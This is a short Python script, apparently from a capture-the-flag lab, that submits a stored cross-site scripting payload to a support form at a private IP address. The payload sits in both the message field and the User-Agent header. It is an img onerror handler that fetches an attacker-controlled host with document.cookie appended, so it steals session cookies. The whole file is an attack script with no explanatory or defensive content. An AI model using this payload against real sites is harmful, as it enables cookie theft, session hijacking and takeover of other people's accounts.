import requests

data = {
    "fname" : "john", 
    "lname":"Hend", 
    "email":"j.here@email.com", 
    "phone":"112123124", 
    "message" : "<img src=x onerror=fetch('http://10.10.16.6:8000/'+document.cookie);>"}

cookie = {"is_admin" : "InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs"}
heads = {
    "Content-Type" : "application/x-www-form-urlencoded",
    "User-Agent": "<img src=x onerror=fetch('http://10.10.16.6:8000/'+document.cookie);>"
}

resp = requests.post("http://10.10.11.8:5000/support", data=data, cookies=cookie, headers=heads)
print(resp.text)